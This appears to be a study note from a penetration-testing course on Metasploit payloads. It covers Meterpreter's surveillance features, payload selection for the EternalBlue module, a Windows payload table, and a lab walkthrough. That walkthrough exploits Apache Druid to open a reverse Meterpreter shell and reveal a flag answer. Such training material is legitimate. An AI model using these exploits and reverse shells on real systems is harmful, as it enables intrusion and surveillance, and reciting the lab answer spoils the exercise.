# Payloads
## Meterpreter Payload
The Meterpreter payload is a specific type of multi-faceted payload that uses DLL injection to ensure the connection to the victim host is stable, hard to detect by simple checks, and persistent across reboots or system changes. Meterpreter resides completely in the memory of the remote host and leaves no traces on the hard drive, making it very difficult to detect with conventional forensic techniques. In addition, scripts and plugins can be loaded and unloaded dynamically as required.

It offers us a plethora of useful commands, varying from keystroke capture, password hash collection, microphone tapping, and screenshotting to impersonating process security tokens. We will delve into more detail about Meterpreter in a later section.
## Searching for Payloads
**MSF - List Payloads**
```
msf6 > show payloads
```
**MSF - Searching for Specific Payload**
```
msf6 exploit(windows/smb/ms17_010_eternalblue) > grep meterpreter show payloads
```
Now we can add another grep command after the first one and search for `reverse_tcp`.
```
msf6 exploit(windows/smb/ms17_010_eternalblue) > grep meterpreter grep reverse_tcp show payloads
```

## Selecting Payloads
To set the payload for the currently selected module, we use `set payload <no.>` only after selecting an Exploit module to begin with.
```
msf6 exploit(windows/smb/ms17_010_eternalblue) > show options

Module options (exploit/windows/smb/ms17_010_eternalblue):

   Name           Current Setting  Required  Description
   ----           ---------------  --------  -----------
   RHOSTS                          yes       The target host(s), range CIDR identifier, or hosts file with syntax 'file:<path>'
   RPORT          445              yes       The target port (TCP)
   SMBDomain      .                no        (Optional) The Windows domain to use for authentication
   SMBPass                         no        (Optional) The password for the specified username
   SMBUser                         no        (Optional) The username to authenticate as
   VERIFY_ARCH    true             yes       Check if remote architecture matches exploit Target.
   VERIFY_TARGET  true             yes       Check if remote OS matches exploit Target.


Exploit target:

   Id  Name
   --  ----
   0   Windows 7 and Server 2008 R2 (x64) All Service Packs



msf6 exploit(windows/smb/ms17_010_eternalblue) > grep meterpreter grep reverse_tcp show payloads

   15  payload/windows/x64/meterpreter/reverse_tcp                          normal  No     Windows Meterpreter (Reflective Injection x64), Windows x64 Reverse TCP Stager
   16  payload/windows/x64/meterpreter/reverse_tcp_rc4                      normal  No     Windows Meterpreter (Reflective Injection x64), Reverse TCP Stager (RC4 Stage Encryption, Metasm)
   17  payload/windows/x64/meterpreter/reverse_tcp_uuid                     normal  No     Windows Meterpreter (Reflective Injection x64), Reverse TCP Stager with UUID Support (Windows x64)


msf6 exploit(windows/smb/ms17_010_eternalblue) > set payload 15

payload => windows/x64/meterpreter/reverse_tcp
```
After selecting a payload, we will have more options available to us.
```
msf6 exploit(windows/smb/ms17_010_eternalblue) > show options

Module options (exploit/windows/smb/ms17_010_eternalblue):

   Name           Current Setting  Required  Description
   ----           ---------------  --------  -----------
   RHOSTS                          yes       The target host(s), range CIDR identifier, or hosts file with syntax 'file:<path>'
   RPORT          445              yes       The target port (TCP)
   SMBDomain      .                no        (Optional) The Windows domain to use for authentication
   SMBPass                         no        (Optional) The password for the specified username
   SMBUser                         no        (Optional) The username to authenticate as
   VERIFY_ARCH    true             yes       Check if remote architecture matches exploit Target.
   VERIFY_TARGET  true             yes       Check if remote OS matches exploit Target.


Payload options (windows/x64/meterpreter/reverse_tcp):

   Name      Current Setting  Required  Description
   ----      ---------------  --------  -----------
   EXITFUNC  thread           yes       Exit technique (Accepted: '', seh, thread, process, none)
   LHOST                      yes       The listen address (an interface may be specified)
   LPORT     4444             yes       The listen port


Exploit target:

   Id  Name
   --  ----
   0   Windows 7 and Server 2008 R2 (x64) All Service Packs
```
## Using Payloads
**Note**: `Meterpreter` has its own commands. Use `help` to view all the available commands. We also see the option to open a shell channel. This will place us in the actual Windows command-line interface.
```
meterpreter > shell

Process 2664 created.
Channel 1 created.

Microsoft Windows [Version 6.1.7601]
Copyright (c) 2009 Microsoft Corporation. All rights reserved.

C:\Users>
```
## Payload Types
The table below contains the most common payloads used for Windows machines and their respective descriptions.
|Payload|Description|
|-|-|
|`generic/custom`|Generic listener, multi-use|
|`generic/shell_bind_tcp`|Generic listener, multi-use, normal shell, TCP connection binding|
|`generic/shell_reverse_tcp`|Generic listener, multi-use, normal shell, reverse TCP connection|
|`windows/x64/exec`|Executes an arbitrary command (Windows x64)|
|`windows/x64/loadlibrary`|Loads an arbitrary x64 library path|
|`windows/x64/messagebox`|Spawns a dialog via MessageBox using a customizable title, text & icon|
|`windows/x64/shell_reverse_tcp`|Normal shell, single payload, reverse TCP connection|
|`windows/x64/shell/reverse_tcp`|Normal shell, stager + stage, reverse TCP connection|
|`windows/x64/shell/bind_ipv6_tcp`|Normal shell, stager + stage, IPv6 Bind TCP stager|
|`windows/x64/meterpreter/$`|Meterpreter payload + varieties above|
|`windows/x64/powershell/$`|Interactive PowerShell sessions + varieties above|
|`windows/x64/vncinject/$`|VNC Server (Reflective Injection) + varieties above|

## Questions
1. Exploit the Apache Druid service and find the flag.txt file. Submit the contents of this file as the answer. **Answer: HTB{MSF_Expl01t4t10n}**
   - Use msfconsole and search for the Apach Druid service using: `search Apache Druid`
   - Use the module `exploit(linux/http/apache_druid_js_rce)`
   - Set the `LHOST` (host's IP) and `RHOSTS` (target's IP) as required and run the exploit
        ```
        [msf](Jobs:0 Agents:0) exploit(linux/http/apache_druid_js_rce) >> exploit
        [*] Started reverse TCP handler on 10.10.14.80:4444 
        [*] Running automatic check ("set AutoCheck false" to disable)
        [+] The target is vulnerable.
        [*] Using URL: http://10.10.14.80:8080/VnRMccqIo
        [*] Client 10.129.203.52 (curl/7.68.0) requested /VnRMccqIo
        [*] Sending payload to 10.129.203.52 (curl/7.68.0)
        [*] Sending stage (3090404 bytes) to 10.129.203.52
        [*] Meterpreter session 1 opened (10.10.14.80:4444 -> 10.129.203.52:60956) at 2025-10-01 10:18:18 -0500
        [*] Command Stager progress - 100.00% done (113/113 bytes)
        [*] Server stopped.

        (Meterpreter 1)(/root/druid) > shell
        find / -name "flag.txt"
        /root/flag.txt
        cat /root/flag.txt
        HTB{MSF_Expl01t4t10n}
        ```